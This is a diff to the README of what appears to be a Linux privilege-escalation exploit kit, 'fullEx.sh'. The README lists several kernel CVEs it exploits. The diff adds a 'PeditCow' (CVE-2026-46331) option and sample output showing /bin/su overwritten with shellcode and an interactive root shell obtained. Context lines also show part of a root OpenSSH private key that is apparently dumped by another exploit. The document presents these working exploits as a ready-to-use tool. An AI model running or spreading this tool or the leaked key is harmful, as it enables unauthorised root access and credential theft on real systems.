@@ -15,6 +15,7 @@
 | Dirty-Frag | CVE-2026-43284 | ✅ |
 | Fragnesia | CVE-2026-46300 |✅|
 | DirtyDecrypt | CVE-2026-31635 |✅|
+| PeditCow | CVE-2026-46331 |✅|
 | DirtyClone | CVE-2026-43503 |❌|
 
 ## ⚙️ Outils
@@ -66,6 +67,7 @@ Exploits:
    -DirtyFrag     Dirty Frag - CVE-2026-43284
    -Fragnesia     Fragnesia - CVE-2026-46300
    -DirtyDecrypt  pwn-key-ssh & chage - CVE-2026-31635
+   -PeditCow      PeditCow - CVE-2026-46331
  
 Cmds:
    -check         Verifie si gcc est installer
@@ -386,4 +388,13 @@ oSAe6XDyPGYYzEG2aA6atyfvybuHywspDljmSDWKnhockJvgV+7xz6WHCs/S4wf0pdanZJ
 kAAAAhAN2+SJmR1TjQaFfcYq4sEhPUs0NaPEnle/9Ec+zX/bUNAAAAC3Jvb3RAZGViaWFu
 AQIDBA==
 -----END OPENSSH PRIVATE KEY-----
+```
+## 💀 PeditCow
+
+```
+user@debian:~/fullEx$ ./fullEx.sh -PeditCow
+[*] target /bin/su as uid 1001; entry at file offset 0x4330; shellcode 48 bytes
+[+] su entry overwritten; exec'ing su -> interactive root shell
+# id
+uid=0(root) gid=0(root) groups=0(root),27(sudo),100(users),1001(user)
 ```
